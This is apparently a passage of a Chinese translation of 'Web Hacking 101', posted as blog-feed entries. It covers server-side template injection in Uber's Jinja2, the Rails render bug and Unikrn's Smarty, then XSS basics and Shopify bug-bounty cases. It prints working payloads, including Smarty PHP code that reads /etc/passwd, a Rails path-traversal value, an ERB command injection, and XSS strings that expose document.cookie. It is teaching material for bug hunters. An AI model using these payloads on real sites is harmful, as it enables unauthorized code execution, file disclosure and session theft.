href="https://hackerone.com/reports/125980/">https://hackerone.com/reports/125980/</a></p><p>报告日期：2016年3月25日</p><p>悬赏金：10000美元</p><p>当你进行黑客攻击时，确定一家公司使用的技术是很重要的。当Uber在HackerOne上推出公开的bug悬赏计划时，它还在其网站上添加了一张“藏宝图”<code>https://eng.uber.com/bug-bounty/</code></p><p>（修订后的地图于2017年8月在<code>https://medium.com/uber-security-privacy/uber-bug-bountygurey-map-17192af85c1a/</code>). 这张地图确定了Uber运营的一些敏感资产，包括每一处使用的软件。</p><p>优步在地图中披露了这一点<code>riders.uber.com</code>是用Node.js, Express 和 Backbone.js  ，其中没有一个会立即显示出能有潜在的SSTI攻击可能。但是网站<code>vault.uber.com</code>以及<code>partners.uber.com</code>用FLASK和Jinja2进行开发。Jinja2是一个服务器端模板引擎，如果实现不正确，可以允许远程代码执行。尽管<code>riders.uber.com</code>没有使用Jinja2，如果站点向vault或partners子域提供输入，并且这些站点信任输入而不进行清理，则攻击者可能能够利用SSTI漏洞进行攻击。</p><p>发现此漏洞的黑客Orange Tsai输入<code>{{1+1}}</code>作为他的名字，开始测试SSTI漏洞。他寻找子域之间是否发生了相互作用。在他的报告中，Orange解释说，对<code>riders.uber.com</code>的profile进行修改，会导致给帐户所有者发送一封电子邮件，通知他们profile发生更改（这是一种常见的安全方法）。通过在站点上更改他的名字为<code>{1+1}}</code>，他收到了一封名为2的电子邮件，如图8-1所示。</p><p><img src="/part8-mo-ban-zhu-ru/Part8-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%5Cwh101_801.png"></p><center> 图8-1：Orange收到的电子邮件，执行他注入自己名字的代码 </center><p>这一行为立即引起了一个危险信号，因为Uber执行了他的表达式，并将其替换为方程式的结果。Orange然后尝试提交Python代码<code>{% for c in [1,2,3]%} {{c,c,c}} {% endfor %}</code>   ，以确认可以实现更复杂的操作。这段代码在数组[1,2,3]上迭代，并将每个数字打印三次。图8-2中的电子邮件显示Orange的名字显示为9个数字，这是for循环执行的结果，这证实了他的发现。</p><p><img src="/part8-mo-ban-zhu-ru/Part8-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%5Cwh101_802.png"></p><center>图8-2：Orange注入更复杂代码的电子邮件</center><p>Jinja2还实现了一个沙盒，它限制了执行任意代码的能力，但偶尔也会被绕过。Orange在他的报告中只报告了执行代码的能力，但他本可以进一步研究这个漏洞。在他的报告中，他认为nVisium的博客文章提供了找到漏洞所需的信息。但是这些帖子也包含了关于Jinja2漏洞的范围的附加信息。</p><p>让我们稍微绕道看看这些附加信息是如何应用到Orange的漏洞上的，请看nVisium的博客文章<a href="https://nvisium.com/blog/2016/03/09/exploring-ssti-inflask-jinja2.html%E3%80%82%E5%9C%A8%E8%BF%99%E7%AF%87%E5%8D%9A%E6%96%87%E4%B8%AD%EF%BC%8CnVisium%E9%80%9A%E8%BF%87%E4%BD%BF%E7%94%A8%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%BC%96%E7%A8%8B%E6%A6%82%E5%BF%B5introspection%E6%9D%A5%E4%BB%8B%E7%BB%8D%E5%AF%B9Jinja2%E7%9A%84%E5%BC%80%E5%8F%91%E3%80%82Introspection">https://nvisium.com/blog/2016/03/09/exploring-ssti-inflask-jinja2.html。在这篇博文中，nVisium通过使用面向对象的编程概念introspection来介绍对Jinja2的开发。Introspection</a>  涉及到在运行时检查对象的属性，以查看对其可用的数据。面向对象的Introspection  如何工作的细节超出了本书的范围。在这个bug的上下文中，Introspection  允许Orange执行代码并确定在注入发生时模板对象可用的属性。一旦攻击者知道这些信息，他们就可以找到可以用来实现远程代码执行的潜在可利用属性。</p><p>当Orange发现此漏洞时，他只是报告了执行Introspection  所需代码的能力，而不是试图进一步分析该漏洞。最好采用Orange的方法，因为它可以确保您不会执行任何意外的操作；而且，公司可以评估该漏洞的潜在影响。如果您有兴趣探究问题的全部严重性，请在报告中询问公司是否可以继续测试。</p><p><strong>重点</strong></p><p>请注意网站使用的技术；通常，这些技术可以帮助您深入了解如何利用该网站。一定要考虑这些技术是如何相互作用的。在这个例子，Flask和Jinja2是很好的攻击载体，尽管它们没有直接用于易受攻击的站点。与XSS漏洞一样，请检查所有可能使用输入的地方，因为漏洞可能不会立即显现出来。在本例中，恶意payload在用户的配置文件页面上呈现为明文，但在发送电子邮件时执行代码。</p><h2 id="Rails-动态渲染"><a href="#Rails-动态渲染" class="headerlink" title="Rails 动态渲染"></a>Rails 动态渲染</h2><p>难度：中等</p><p>网址：不适用</p><p>资料来源：<a href="https://nvisium.com/blog/2016/01/26/railsdynamic-render-to-rce-cve-2016-0752/">https://nvisium.com/blog/2016/01/26/railsdynamic-render-to-rce-cve-2016-0752/</a></p><p>报告日期：2015年2月1日</p><p>悬赏金：无</p><p>2016年初，Ruby on Rails团队在处理呈现模板的方式中披露了一个潜在的远程代码执行漏洞。nVisium团队的一名成员发现了该漏洞，并提供了一份关于该问题的有价值的报告，即CVE-2016-0752。rubyonrails使用模型、视图、控制器架构（MVC）设计。在这个设计中，数据库逻辑（模型）与表示逻辑（视图）和应用程序逻辑（控制器）分离。MVC是编程中一种常见的设计模式，可以提高代码的可维护性。</p><p>在报告中，nVisium团队解释了Rails控制器（负责应用程序逻辑）如何根据用户控制的参数推断出要渲染的模板文件。根据站点的开发方式，这些用户控制的参数可以直接传递给负责将数据传递到表示逻辑的<code>render</code>方法。开发人员将输入传递到<code>render</code>函数时可能会出现此漏洞，例如调用<code>render</code>方法和<code>params[：template]</code>，其中<code>params[：template]</code>值是dashboard。在Rails中，来自HTTP请求的所有参数都可以通过<code>params</code>数组提供给应用程序控制器逻辑。</p><p>在这种情况下，在HTTP请求中提交一个参数template并传递给render函数。这种行为值得注意，因为render方法没有为Rails提供特定的上下文；换句话说，它没有提供指向特定文件的路径或链接，并自动确定哪个文件应向用户返回内容。之所以能够做到这一点，是因为Rails实现了约定优先于配置：传递给render函数的任何模板参数值都将用于搜索文件名并渲染。根据这个发现，Rails首先递归地搜索应用程序根目录/app/views。这是用于为用户渲染内容的所有文件的通用默认文件夹。如果Rails找不到使用给定名称的文件，它会扫描应用程序根目录。如果仍然找不到文件，Rails会扫描服务器根目录。</p><p>在CVE-2016-0752提交之前，恶意用户可以传递<code>template=%2fect%2passwd</code>，Rails会在views目录中查找/etc/passwd，然后是应用程序目录，最后是服务器根目录。假设您使用的是Linux机器并且该文件是可读的，那么Rails将打印您的/etc/passwd文件。</p><p>根据nVisium的文章，当用户提交模板注入时，Rails使用的搜索序列也可以用于执行任意代码，比如<code>&lt;%25%3d</code>ls<code>%25&gt;</code>。如果站点使用默认的Rails模板语言ERB，这个编码的输入将被解释为<code>&lt;%=</code>ls<code>%&gt;</code>，即使用Linux命令列出当前目录中的所有文件。而Rails团队已经修复了此漏洞，在开发人员将用户控制的输入传递给<code>render inline:</code>时，您仍然可以测试SSTI，因为<code>inline:</code>用于将ERB直接提供给render函数。</p><p><strong>重点</strong></p><p>了解您正在测试的软件如何工作将帮助您发现漏洞。在这个例子，如果Rails站点向render函数传递用户控制的输入，那么它都是易受攻击的。理解Rails使用的设计模式无疑有助于发现这个漏洞。与本例中的template参数一样，注意在控制可能与内容渲染方式直接相关的输入时出现的机会。</p><h3 id="UNIKRN-SMARTY模板注入"><a href="#UNIKRN-SMARTY模板注入" class="headerlink" title="UNIKRN SMARTY模板注入"></a>UNIKRN SMARTY模板注入</h3><p>难度：中等</p><p>网址：不适用</p><p>资料来源：<a href="https://hackerone.com/reports/164224/">https://hackerone.com/reports/164224/</a></p><p>报告日期：2016年8月29日</p><p>悬赏金：400美元</p><p>2016年8月29日，作者受邀参加了电子竞技博彩网站Unikrn的私人漏洞奖励计划。在最初的站点勘测中，作者使用的Wappalyzer工具证实了该站点使用的是AngularJS。这一发现给我带来了危险，因为作者已经成功地找到了AngularJS注入漏洞。通过提交<code>{{7*7}}</code>并从profile开始查找渲染的数字49，开始查找CSTI漏洞。虽然我在profile页面上没有成功，但我注意到你可以邀请朋友来这个网站，所以我也测试了这个功能。在向自己提交邀请后，我收到了一封奇怪的电子邮件，如图8-3所示。</p><p><img src="/part8-mo-ban-zhu-ru/Part8-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%5Cwh101_803.png"></p><center>图8-3：从Unikrn收到的带有Smarty错误的电子邮件</center><p>电子邮件的开头包含一个堆栈跟踪，其中有一个Smarty错误，显示7<em>7无法识别。看起来{7</em>7}}被注入到模板中，Smarty试图执行代码，但没有识别出7*7。</p><p>立即查阅了james kettle关于模板注入的必不可少的文章(<a href="http://blog.portswigger.net/2015/08/server-side-templateinjection.html)%E4%B8%BA%E4%BA%86%E6%B5%8B%E8%AF%95%E4%BB%96%E5%BC%95%E7%94%A8%E7%9A%84Smarty">http://blog.portswigger.net/2015/08/server-side-templateinjection.html)为了测试他引用的Smarty</a> payload。    <code>{self:：getStreamVariable（“file:///proc/self/loginuuid”）}</code>，它调用<code>getStreamVariable</code>方法来读取文件<code>/proc/self/loginuuid</code>。尝试了他共享payload，但没有收到任何输出。</p><p>将profile名称改为{$smarty.version}并重新邀请我自己到网站。结果是一封邀请邮件，我的名字是2.6.18，这是安装在网站上的Smarty版本。当继续阅读文档时，了解到可以使用标记<code>{php}{/php}</code>来执行任意php代码（Kettle在他的文章中特别提到了这些标记）。因此，尝试将payload:<code>{php}print“Hello”{/php}</code>作为我的名字，并再次提交了邀请。已经确认了我的网站已经邀请我打印的电子邮件功能。</p><p>为了证明这个程序的漏洞，我想把它作为最终的测试。尽管/etc/passwd文件并不重要，但访问它通常用作一个标志来演示远程代码执行。所以我用了以下payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">{php}$s=file_get_contents('/etc/passwd');var_dump($s);{/php}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这段PHP代码打开<code>/etc/passwd</code>文件，使用<code>file_get_contents</code>读取其内容，并将内容分配给<code>$s</code>变量。一旦设置了<code>$s</code>，我就使用<code>var_dump</code>转储该变量的内容，希望收到的电子邮件将包含<code>/etc/passwd</code>的内容，作为邀请我访问Unikrn站点的人的姓名。但奇怪的是，我收到的邮件只有一个空名字。</p><p>我想知道Unikrn是否限制了名字的长度。这一次，我在PHP文档中搜索了<code>file_get_content</code>，其中详细说明了如何限制一次读取的数据量。我把我的payload改为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">{php}$s=file_get_contents('/etc/passwd',NULL,NULL,0,100);var_dump($s);{/php}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个payload中的关键参数是    <code>'/etc/passwd'</code>，0和100。路径指的是要读取的文件，0指示PHP从文件中从哪里开始（在本例中是在文件的开头），100表示要读取的数据的长度。我用这个payload重新邀请自己加入Unikrn，它产生了如图8-4所示的电子邮件。</p><p><img src="/part8-mo-ban-zhu-ru/Part8-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%5Cwh101_804.png"></p><center>图8-4:Unikrn邀请电子邮件显示/etc/passwd文件的内容</center><p>成功地执行了任意代码，并作为ROC，一次提取了<code>/etc/passwd</code>文件100个字符。</p><p><strong>重点</strong></p><p>处理这个漏洞非常有趣。最初的堆栈跟踪是一个错误的信号，正如俗话所说，“哪里有烟，哪里就有火”。如果你发现了潜在的SSTI，一定要阅读文档以确定如何有效地继续。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当您搜索漏洞时，最好尝试确认底层技术（无论是web框架、前端渲染引擎或其他东西）以识别可能的攻击向量和要测试的思想。模板引擎的多样性使得很难确定在所有情况下都有效，但知道使用的是哪种技术将帮助您克服这一挑战。在渲染您控制的文字时，请留意出现的机会。此外，请记住，漏洞可能不会立即显现，但仍可能存在于其他功能中，例如电子邮件中。</p>]]></content>
      
      
      <categories>
          
          <category> WebHacking101 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> web安全 </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Part7 XSS</title>
      <link href="part7-xss/"/>
      <url>part7-xss/</url>
      
        <content type="html"><![CDATA[<h1 id="Part7-XSS"><a href="#Part7-XSS" class="headerlink" title=" Part7 XSS "></a><center> Part7 XSS </center></h1><p><font color="#A52A2A" size="4"><em>本文是《Web Hacking 101》的翻译笔记，仅供参考学习，禁止二传。</em></font></p><p>跨站点脚本（XSS）漏洞最著名的例子之一是Samy Kamkar创建的Myspace Samy蠕虫。2005年10月，Kamkar利用Myspace上的一个漏洞，允许他在个人资料中存储JavaScript payload。每当登录的用户访问他的Myspace profile时，payload代码就会执行，使得查看过的人都默认在Myspace上加Kamkar为好友，并更新查看者的配置文件，使其显示“but most of all, samy is my hero”这段文字。然后代码会将自身复制到查看者的profile，并继续感染其他Myspace用户页面。       </p><p>Kamkar的蠕虫就是一个极端的例子，但是他的漏洞显示了XSS漏洞可能对网站产生的深远影响。与我到目前为止所讨论的其他漏洞类似，当网站呈现某些未定义的字符时，会发生XSS，导致浏览器执行恶意JavaScript。允许出现XSS漏洞的字符包括双引号（“）、单引号（’）和尖括号（&lt;&gt;）。        如果站点正确地清理字符，则字符将呈现为HTML实体。例如，网页的页源将显示以下字符：        </p><pre class="line-numbers language-none"><code class="language-none">A double quote (") as " or &amp;#34;A single quote (') as &amp;apos; or 'An opening angle bracket (&lt;) as &lt; or &amp;#60;A closing angle bracket (&gt;) as &gt; or &amp;#62;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这些特殊字符如果没有被清除，就可以用HTML和JavaScript定义web页面的结构。例如，如果站点没有清理尖括号，则可以插入<code>&lt;script&gt;&lt;/script&gt;</code>来插入payload，如下所示：        </p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;alert(document.domain);&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当您将此payload提交到不清理特殊字符的网站时，<code>&lt;script&gt;&lt;/script&gt;</code>标记指示浏览器执行在它们之间的JavaScript。Payload执行警报功能，创建一个弹出对话框，显示传递到alert的信息。括号内对文档的引用是DOM，它返回站点的域名。例如，如果payload在<code>https://www.&lt;example&gt;.com/foo/bar/</code>上执行，则弹出对话框显示<code>www.&lt;example&gt;.com</code>。</p><p> 当您发现XSS漏洞时，请确认其影响，因为并非所有XSS漏洞都相同。确认bug的影响并把对bug的分析包含到您的报告，可以帮助测试人员验证您的错误，有可能会提高您的奖金。        </p><p> 例如，不在敏感cookie上使用httponly标志的站点上的XSS漏洞与在敏感cookie上使用httponly标志的站点上的XSS漏洞不同。当站点没有httponly标志时，XSS可以读取cookie值；如果这些值包括标识cookie的会话，则可以窃取目标的会话并访问其帐户。您可以向document.cookie弹出警报框，以确认您可以读取敏感cookie（知道站点认为哪些cookie是敏感的需要在每个站点上试错）。即使无法访问敏感的cookie，也可以向document.domain发出警报，以确认是否可以从DOM访问敏感的用户信息并代表目标执行操作。 </p><p>但是，如果不警告正确的域名，XSS可能不是站点的漏洞。例如，如果从沙盒<code>iFrame</code>向<code>document.domain</code>发出警报，则JavaScript可能是无害的，因为它无法访问cookies、对用户帐户执行操作或从DOM访问敏感的用户信息。 JavaScript是无害的，因为浏览器实现了作为安全机制的同源策略（SOP）。SOP限制文档（DOM中的D）如何与从另一个源加载的资源交互。SOP保护无辜的网站免受试图通过用户利用网站的恶意网站的攻击。例如，如果您访问了<code>www.&lt;malitive&gt;.com</code>并在浏览器中调用了对<code>www.&lt;example&gt;.com/profile</code>的GET请求，则SOP将阻止<code>www.&lt;malitive&gt;.com</code>读取<code>www.&lt;example&gt;.com/profile</code>响应。<code>www.&lt;example&gt;.com</code>网站可能允许来自不同源的网站与其交互，但通常这些交互仅限于特定受信任网站<code>www.&lt;example&gt;.com</code>。        </p><p> 网站的协议（如HTTP或HTTPs）、主机（如<code>www.&lt;example&gt;.com</code>）和端口决定了网站的来源。Internet Explorer是此规则的例外。它不认为port是源的一部分。表7-1显示了源的示例，以及它们是否与<code>http://www.&lt;example&gt;.com/</code>相同。   </p><p><img src="/part7-xss/sop.png"></p><center>*表7-1:SOP示例*</center><p>某些情况下，URL与源不匹配。例如，about:blank和javascript:schemes继承打开它们的文档的源。about:blank上下文从浏览器访问信息或与浏览器交互，而javascript:执行 javascript。URL不提供关于其源的信息，因此浏览器处理这两个上下文的方式不同。当您发现XSS漏洞时，在ROC中使用alert（document.domain）会很有帮助：它可以确认XSS执行的来源，特别是当浏览器中显示的URL与XSS执行的源不同时。这正是网站打开javascript:URL时发生的情况。如果<code>www.&lt;example&gt;.com</code>打开了<code>javascript:alert（document.domain）</code>的URL，浏览器地址将显示<code>javascript:alert（document.domain）</code>。但alert框将显示<code>www.&lt;example&gt;.com</code>，因为<code>alert</code>继承了上一个document的源。        </p><p>虽然我只介绍了一个使用HTML<code>&lt;script&gt;</code>标记来实现XSS的示例，但是当您发现可能的注入时，您不能总是提交HTML标记。在这些情况下，您可以提交单引号或双引号来注入XSS payload。XSS可能很重要，这取决于注入发生的位置。例如，假设您可以访问以下代码的value属性：        <code>&lt;input type=“text”name=“username”value=“hacker”width=50px&gt;</code>        通过在value属性中注入双引号，可以关闭现有的引用并将恶意的XSS有效载荷注入到标签中。您可以通过将value属性更改为<code>hacker“onfocus=alert（document.cookie）autofocus”</code>来完成此操作，如下所示：  </p><pre class="line-numbers language-none"><code class="language-none">&lt;input type="text" name="username" value="hacker"  onfocus=alert(document.cookie) autofocus "" width=50px&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>autofocus</code>属性指示浏览器在页面加载后立即将光标焦点放在输入文本框上。<code>onfocus</code> 属性告诉浏览器在输入文本框为焦点时执行JavaScript（如果没有<code>autofocus</code>，则当用户单击文本框时将发生onfocus）。但这两个属性有限制：不能<code>autofocus</code>到隐藏字段。此外，如果一个页面上有多个具有<code>autofocus</code>功能的字段，则第一个或最后一个元素将获得焦点，具体取决于浏览器。当payload运行时，它将弹出显示<code>document.cookie</code>的警告框。</p><p>类似地，假设您可以访问<code>&lt;script&gt;</code>标记中的变量。如果可以在下面的代码中将单引号插入<code>name</code>变量的值中，则可以完成变量的赋值，并执行自己的JavaScript：</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;   var name = 'hacker'; &lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为我们可以控制值<code>hacker</code>，所以将<code>name</code>变量更改为<code>hacker'；alert（document.cookie）；'</code>将得到以下结果： </p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;   var name = 'hacker';alert(document.cookie);''; &lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  注入单引号和分号将完成变量名赋值。因为我们使用的是<code>&lt;script&gt;</code>标记，所以我们注入的JavaScript函数<code>alert（document.cookie）</code>将执行。我们添加一个额外的<code>;'</code>以结束函数调用，并确保JavaScript语法正确，因为站点包含一个<code>'；</code>以完成<code>name</code>变量赋值。如果结尾没有<code>'；</code>，这样会导致只有单个的单引号，这可能会破坏网页的语法。</p><p> 如您现在所知，您可以使用多种方法执行XSS。Cure53的渗透测试专家维护的网站<a href="http://html5sec.org/%E6%98%AFXSS">http://html5sec.org/是XSS</a> payload的一个很好的参考。        </p><h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><p>XSS主要有两种类型：反射型和存储型。当没有存储在站点任何位置的单个HTTP请求交付并执行XSS payload时，就会发生反射XSS。浏览器，包括Chrome、Internet Explorer和Safari，都试图通过引入XSS审计器来防止这类漏洞（2018年7月，微软宣布，由于可用于防止XSS的其他安全机制，他们将放弃Edge浏览器中的XSS审计器）。XSS审计器试图保护用户免受执行JavaScript的恶意链接的攻击。当发生XSS尝试时，浏览器会显示一个断开的页面，并显示一条消息，说明该页面已被阻止以保护用户。</p><p>尽管浏览器开发人员尽了最大努力，但攻击者经常绕过XSS审计器，因为JavaScript可以在站点上以复杂的方式执行。因为这些绕过XSS审计器的方法经常会改变，所以它们超出了本书的范围。但是有两个很好的资源可以对其进行进一步了解，FileDescriptor在<a href="https://blog.innerht.ml/the-mistrued-x-xss-protection/%E4%B8%8A%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0%E5%92%8CMasato">https://blog.innerht.ml/the-mistrued-x-xss-protection/上的博客文章和Masato</a> Kinugawa的<a href="https://github.com/masatokinugawa/filter">https://github.com/masatokinugawa/filter</a> bypass/wiki/Browser’s-xss-filter-bypass-cheat-sheet/。        </p><p>当站点保存恶意payload并将其呈现并未被清除时，会发生存储型XSS。站点也可能在不同的位置呈现输入的payload。Payload可能不会在提交后立即执行，但可以在访问另一页面时执行。例如，如果您在以XSS payload为名称的网站上创建概要文件，则XSS可能不会在您查看概要文件时执行；相反，它可能会在有人搜索您的名称或向您发送消息时执行。</p><p>您还可以将XSS攻击分为以下三个子类别：基于DOM的、盲目的（blind）和自身的（self）。基于DOM的XSS攻击涉及操纵网站的现有JavaScript代码来执行恶意JavaScript；它可以是存储型或反射型。例如，假设web页面<code>www.&lt;example&gt;.com/hi/</code>使用以下HTML将其页面内容替换为来自URL的值，而不检查恶意输入。</p><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;  &lt;body&gt;   &lt;h1&gt;Hi &lt;span id="name"&gt;&lt;/span&gt;&lt;/h1&gt;   &lt;script&gt;document.getElementById('name').innerHTML=location.hash.split('#')    [1]&lt;/script&gt;  &lt;/body&gt; &lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例网页中，script标记调用document对象的<code>getElementById</code>方法来查找ID为“name”的HTML元素。调用返回对<code>&lt;h1&gt;</code>标记中的span元素的引用。接下来，script标记使用<code>innerHTML</code>方法修改标记之间的文本。脚本将<code>&lt;span&gt;&lt;/span&gt;</code>之间的文本设置为<code>location.hash</code>的值，该值是在URL中的#之后出现的任何文本（location是另一个浏览器API，类似于DOM；它提供对当前URL信息的访问）。  因此，访问<code>www.&lt;example&gt;.com/hi#Peter/</code>将导致页面的HTML动态更新为<code>&lt;h1&gt;&lt;span id="name"&gt;Peter&lt;/span&gt;&lt;/h1&gt;</code>。但在更新<code>&lt;span&gt;</code>元素之前，此页不会清除URL中的值。因此，如果用户访问了<code>www.&lt;example&gt;.com/h1#&lt;img src=x onerror=alert（document.domain）&gt;</code>，则会弹出一个JavaScript警报框，并显示<code>www.&lt;example&gt;.com</code>（假设浏览器未返回图像x）。页面生成的HTML如下所示：</p><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;  &lt;body&gt;   &lt;h1&gt;Hi &lt;span id="name"&gt;&lt;img src=x onerror=alert(document.domain)&gt;&lt;/span&gt;    &lt;/h1&gt;   &lt;script&gt;document.getElementById('name').innerHTML=location.hash.split('#')    [1]&lt;/script&gt;  &lt;/body&gt; &lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>网页将显示一个带有<code>document.domain</code>的JavaScript警告框，而不是在<code>&lt;h1&gt;</code>标记之间的Peter。攻击者可以使用此选项，因为要执行任何JavaScript，他们会将<code>&lt;img&gt;</code>标记的JavaScript属性提供给<code>onerror</code>。</p><p>Blind XSS是一种存储的XSS攻击，另一个用户从黑客无法访问的网站位置呈现XSS payload。例如，如果在网站上创建个人配置文件时可以将XSS添加为您的名字和姓氏，则可能会发生这种情况。当普通用户查看您的配置文件时，可以对这些值进行清洗。但是，当管理员访问列出站点上所有新用户的管理页面时，这些值可能不会被清除，XSS可能会执行。Matthew Bryant的工具XSSHunter（<a href="https://xsshunter.com/%EF%BC%89%E6%98%AF%E6%A3%80%E6%B5%8Bblind">https://XSSHunter.com/）是检测blind</a> XS的理想工具。Bryant设计的payload执行JavaScript，它加载一个远程脚本。当脚本执行时，它读取DOM、浏览器信息、cookies和payload发送回xshunter帐户的其他信息。        </p><p>Self XSS漏洞是那些只能影响输入payload的用户的漏洞。由于攻击者只能攻击自己，self XSS被认为是低严重性的，并且在大多数bug赏金程序中不符合获得奖励的条件。例如，当XSS通过POST请求提交时，就可能发生这种情况。但由于请求受CSRF保护，因此只有目标方可以提交XSS payload。</p><p>如果找到self XSS，请想方设法将其与另一个可能影响其他用户的漏洞（如登录/注销CSRF）结合起来。在这种类型的攻击中，目标将从其帐户注销并登录到攻击者的帐户以执行恶意JavaScript。通常，登录/注销CSRF攻击需要使用恶意JavaScript将目标重新登录到帐户中。我们不会讨论使用登录/注销CSRF的bug，但一个很好的例子是Jack Whitton在Uber网站上发现的bug，要了解这个bug，请查看<a href="https://whitton.io/articles/Uber-turning-self-xss-to-good-xss/%E3%80%82">https://Whitton.io/articles/Uber-turning-self-xss-to-good-xss/。</a>        </p><p>XSS的影响取决于多种因素：它是存储的还是反射的，cookie是否可访问，payload的执行位置，等等。尽管XSS可能对网站造成潜在的损害，但修复XSS漏洞通常很简单，只需要软件开发者在渲染之前将用户输入（与HTML注入一样）进行清洗。</p><h2 id="Softify购物"><a href="#Softify购物" class="headerlink" title="Softify购物"></a>Softify购物</h2><p>难度：低        </p><p>网址：<code>wholesale.shopify.com/  </code>      </p><p>来源：<a href="https://hackerone.com/reports/106293/">https://hackerone.com/reports/106293/</a>        </p><p>报告日期：2015年12月21日        </p><p>赏金：500美元        </p><p>XSS payload不必很复杂，但您确实需要根据它们出现的位置以及它们是否包含在HTML或JavaScript标记中对其进行调整。2015年12月，Shopify的批发网站是一个简单的网页，顶部有一个明显的搜索框。此页面上的XSS漏洞很简单，但很容易被忽略：在搜索框中的输入将会出现在JavaScript标记中。        </p><p>人们忽略了这个bug，因为XSS payload没有利用未被清洗的HTML。当XSS利用HTML的显示方式时，攻击者可以看到payload的效果，因为HTML定义了站点的外观。相反，JavaScript代码可以改变站点的外观或执行另一个操作，但它并不定义站点的外观。        </p><p>在本例中，输入<code>“&gt;&lt;script&gt;alert（'XSS'）&lt;/script&gt;</code>不会执行XSS payload <code>alert('XSS')</code>，因为Shopify编码HTML标记<code>&lt;&gt;</code>。这些字符将被无害地呈现为<code>&amp;lt;</code>和<code>&amp;gt;</code>。一名黑客意识到，在网页上的<code>&lt;script&gt;&lt;/script&gt;</code>标记中，输入是未被清理的。很可能，黑客是通过查看页面的源代码（包含页面的HTML和JavaScript）得出这个结论的。通过在浏览器地址栏中输入<code>view-source:URL</code>，可以查看任何网页的源。例如，图7-2显示了<code>https://nostarch.com/</code>站点的部分页面源代码。        在意识到输入未被处理后，黑客将<code>test'；alert（'XSS'）；'</code>输入Shopify的搜索框中，创建一个JavaScript警报框。尽管报告中还不清楚，但Shopify很可能是在一个JavaScript语句中呈现搜索到的术语，比如<code>var search_term='&lt;INJECTION&gt;'</code>。注入的第一部分<code>test'；</code>，将闭合该标记并插入<code>alert('XSS')；</code>作为单独的语句。最后的<code>'</code>将确保JavaScript语法是正确的。结果可能看起来像<code>var search_term='test'；alert（'xss'）；''；</code>。</p><p><img src="/part7-xss/Part7-XSS%5Cnotarch.png"></p><center>图7-2:`https://nostarch.com`的页面源  </center> <p><strong>重点</strong>       </p><p>XSS漏洞不必复杂。Shopify漏洞并不复杂：它只是一个简单的输入文本字段，未被处理的用户输入。在测试XSS时，请确保查看页面源代码，并确认payload是以HTML还是JavaScript标记显示。        </p><h3 id="Shopify货币格式"><a href="#Shopify货币格式" class="headerlink" title="Shopify货币格式"></a>Shopify货币格式</h3><p>难度：低        </p><p>网址：<code>&lt;YOURSITE&gt;.myshoppify.com/admin/settings/general/</code>        </p><p>来源：<a href="https://hackerone.com/reports/104359/">https://hackerone.com/reports/104359/</a>       </p><p> 报告日期：2015年12月9日        </p><p>赏金：1000美元        </p><p>XSS payload并不总是立即执行。因此，黑客应该确保payload在所有可能呈现的地方都得到了适当的清理。在本例中，Shopify的存储设置允许用户更改货币格式。2015年12月，在设置社交媒体页面时，这些输入框中的值没有经过适当处理。恶意用户可以设置存储并在存储的货币设置字段中注入XSS payload，如图7-3所示。payload在商店的社交媒体销售频道显示。恶意用户可以将存储配置为在另一个存储管理员访问销售渠道时执行payload。       </p><p> Shopify使用Liquid模板引擎动态呈现商店页面上的内容。例如，<code>${{}}</code>是Liquid的语法；要呈现的变量是在内部大括号集中输入的。在图7-3中，<code>${{amount}</code>是一个合法值，但当输入值是<code>“&gt;&lt;img src=x onerror=alert（document.domain）&gt;</code>，它是XSS payload。<code>"&gt;</code>闭合HTML标记。当HTML标记闭合后，浏览器将显示图像标记并查找src属性中指示的图像<code>x</code>。因为这个值不太可能存在于SuutType的网站上，浏览器遇到错误，并调用JavaScript事件处理函数<code>OnError</code>。事件处理程序执行处理函数中定义的JavaScript。在本例中，它是函数<code>alert（document.domain）</code>。</p><p><img src="/part7-xss/currency.png"></p><center>图7-3:Shopify在报告时的货币设置页面 </center>       <p>当用户访问currency页面时，JavaScript不会执行，但payload出现在Shopify商店的社交媒体销售频道中。当其他商店管理员单击易受攻击的销售频道选项卡时，恶意的XSS将被执行。        </p><p>**重点 **  </p><p>XSS payload并不总是在提交之后立即执行。因为一个payload可以在一个站点的多个位置使用，所以一定要访问每个位置。在这个例子，仅仅在currency页面上提交恶意payload并不能执行XSS。bug reporter必须配置另一个网站功能以使XSS执行。        </p><h3 id="雅虎邮件存储型XSS"><a href="#雅虎邮件存储型XSS" class="headerlink" title="雅虎邮件存储型XSS"></a>雅虎邮件存储型XSS</h3><p>难度：中等        </p><p>网址：雅虎！邮件        </p><p>来源：<a href="https://klikki.fi/adv/yahoo.html">https://klikki.fi/adv/yahoo.html</a>        </p><p>报告日期：2015年12月26日        </p><p>赏金：10000美元        